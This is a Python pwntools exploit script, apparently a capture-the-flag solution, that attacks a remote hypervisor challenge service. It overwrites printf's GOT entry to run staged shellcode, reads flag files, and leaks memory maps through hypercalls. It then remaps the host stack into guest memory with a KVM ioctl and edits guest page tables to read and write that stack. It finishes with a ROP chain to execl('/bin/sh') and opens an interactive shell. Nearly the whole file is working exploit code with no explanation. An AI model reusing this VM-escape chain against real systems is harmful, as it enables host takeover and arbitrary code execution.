#!/usr/bin/env python2
import string
from pwn import *
context.update(arch='amd64', os='linux')
#context.log_level = 'DEBUG'
p, u = pack, unpack

conn = remote('35.200.23.198', 31733)
conn.recvline()

def make_int(x):
    return str(x & 0xffffffff)

printf_got = 0x202040
printf_plt = 0x7d6
machine_addr = 0x2020A0

program_addr = machine_addr + 0x1004
shellcode_addr = program_addr + 32

stage1 = asm(r'''
  jmp getpc
read:
  pop rsi
  xor edx, edx
  mov dh, 0x1
  xor edi, edi
  xor eax, eax
  syscall  
  jmp sc
  nop
  nop
  nop
getpc:
  call read
sc:
''')

for bad in string.whitespace:
    assert bad not in stage1

prog = ''
prog += make_int(-(machine_addr + 4 - printf_got) / 4 + 2)
prog += '\\' # swap
prog += '\\' # swap
prog += make_int(shellcode_addr - printf_plt)
prog += '+' # add
prog += '\\' # swap
prog += '.' # writed
prog = prog.ljust(32, 'A')
prog += stage1
conn.sendline(prog)

shellcode = ''
shellcode += shellcraft.amd64.linux.open('flag')
shellcode += shellcraft.amd64.mov('ebx', 'eax')
shellcode += shellcraft.amd64.linux.read(fd='ebx', buffer='rsp', count=64)
shellcode += shellcraft.amd64.mov('rbx', 'rax')
shellcode += shellcraft.amd64.linux.write(1, 'rsp', 'rbx')

mmap_addr = 0x4000000
mmap_size = 0x1000000

shellcode += shellcraft.amd64.linux.mmap_rwx(size=mmap_size, address=mmap_addr)
shellcode += shellcraft.amd64.linux.read(fd=0, buffer=mmap_addr, count=0x200)
shellcode += shellcraft.amd64.linux.read(fd=0, buffer=mmap_addr + 0xadd, count=2)
shellcode += shellcraft.amd64.linux.write(1, mmap_addr, mmap_size)

conn.send(asm(shellcode).ljust(0x100))

lib = r'''
// print_file(filename, size)
print_file:
  mov r8, rsi
  call open

  mov rdi, rax
  lea rsi, [rip+buf]
  mov rdx, r8
  call read

  mov rdi, 1
  lea rsi, [rip+buf]
  mov rdx, rax
  jmp write

next_stage:
  lea r8, [rip+buf]
  xor r8, 0x80000
  and r8, 0x80000
  mov rdi, 0
  mov rsi, r8
  mov rdx, 0x200
  call read
  jmp r8

open:
  mov rsi, rdi
  mov edi, 0x8000
  jmp do_hypercall

read:
  mov [rip+args], rdi
  mov [rip+args+8], rsi
  mov [rip+args+16], rdx
  lea rsi, [rip+args]
  mov edi, 0x8001
  jmp do_hypercall

write:
  mov [rip+args], rdi
  mov [rip+args+8], rsi
  mov [rip+args+16], rdx
  lea rsi, [rip+args]
  mov edi, 0x8002
  jmp do_hypercall

ioctl:
  mov [rip+args], rdi
  mov [rip+args+8], rsi
  mov [rip+args+16], rdx
  lea rsi, [rip+args]
  mov edi, 0x8008
  jmp do_hypercall

do_hypercall:
  mov dx, di
  mov eax, esi
  out dx, eax
  in eax, dx
  mov edi, eax
  mov eax, edi
  ret

args:
    .fill 24

buf:
'''

kernel_shellcode = r'''
  lea rdi, [rip+flag2_str]
  mov rsi, 64
  call print_file

  lea rdi, [rip+proc_maps_str]
  mov rsi, 0x1000
  call print_file

  jmp next_stage

flag2_str:
  .asciz "flag2"

proc_maps_str:
  .asciz "/proc/self/maps"

'''

conn.send(asm(kernel_shellcode + lib).ljust(0x200))
conn.send(asm('jmp rax'))

flag1 = conn.recvline()
log.success('flag1: %s', flag1)

flag2 = conn.recvline()
log.success('flag2: %s', flag2)

while True:
    line = conn.recvline()
    if 'hypervisor.elf' in line:
        binary_base = int(line.split('-')[0], 16)
        break
log.info('binary_base = %s', hex(binary_base))

while True:
    line = conn.recvline()
    if 'libc' in line:
        libc_base = int(line.split('-')[0], 16)
        break
log.info('libc_base = %s', hex(libc_base))

libc = ELF('libc.so.6')
libc.address = libc_base

while True:
    line = conn.recvline()
    if '[stack]' in line:
        stack_start, stack_end = (int(addr, 16) for addr in line.split()[0].split('-'))
        break
log.info('stack_start = %s', hex(stack_start))
log.info('stack_end = %s', hex(stack_end))

conn.recvuntil('[vsyscall]\n')

map_phys_stack = r'''
  // slot=1, flags=0
  movq [rip+buf], 1
  // guest_phys_addr
  movq [rip+buf+8], 0x2000000
  // memory_size
  movq [rip+buf+16], 0x%x
  // userspace_addr
  mov rax, 0x%x
  mov [rip+buf+24], rax

  // VM_FD
  mov rdi, 4
  // KVM_SET_USER_MEMORY_REGION
  mov rsi, 0x4020AE46
  lea rdx, [rip+buf]
  call ioctl

  jmp next_stage
''' % (stack_end - stack_start, stack_start)
conn.send(asm(map_phys_stack + lib).ljust(0x200))

def read_stack(addr, n):
    assert n <= 4096
    page_off = addr & 0xfff
    phys_addr = 0x2000000 + (addr - stack_start) & ~0xfff
    read_stack = r'''
    mov rdi, 0x%x
    call map_page

    mov rcx, 0x%x
    mov rdx, rcx

    lea rdi, [rip+buf]
    mov rsi, 0x8000000000
    add rsi, 0x%x
    rep movsb

    mov rdi, 1
    lea rsi, [rip+buf]
    call write

    jmp next_stage

    // map_page(paddr)
    // Maps paddr to 0x8000000000 (4 MB page)
    map_page:
      // pml4
      mov rax, cr3

      // pdpt
      mov rax, [rax+8]
      and rax, 0xfffffffffffff000

      // pdt
      mov rax, [rax]
      and rax, 0xfffffffffffff000

      // pt
      movq [rax], 0x1007
      mov rax, 0x1000

      or rdi, 0x7
      mov [rax], rdi
      
      ret
    ''' % (phys_addr, n, page_off)
    conn.send(asm(read_stack + lib).ljust(0x200))
    return conn.recvn(n)

run_return = binary_base + 0x1743
for addr in xrange(stack_end - 512, stack_start - 512, -512):
    stack = read_stack(addr, 512)
    idx = stack.find(p(run_return))
    if idx != -1:
        run_ret_addr = addr + idx
        break
log.info('run_ret_addr = %s', hex(run_ret_addr))

write_rop = r'''
  mov rdi, 0
  lea rsi, [rip+buf]
  mov rdx, 0x40
  call read
  mov rcx, rax

  mov rdi, 0x8000000000
  add rdi, 0x%x
  lea rsi, [rip+buf]
  rep movsb

  int3
''' % (run_ret_addr & 0xfff)
conn.send(asm(write_rop + lib).ljust(0x200))

binsh = next(libc.search('/bin/sh\0'))
pop_rdi_ret = next(libc.search(asm('pop rdi; ret')))
pop_rsi_ret = next(libc.search(asm('pop rsi; ret')))
pop_rdx_ret = next(libc.search(asm('pop rdx; ret')))

rop = flat(
    pop_rdi_ret,
    binsh,
    pop_rsi_ret,
    binsh,
    pop_rdx_ret,
    0,
    libc.symbols['execl'],
).ljust(0x40)
conn.send(rop)

conn.interactive(prompt='')
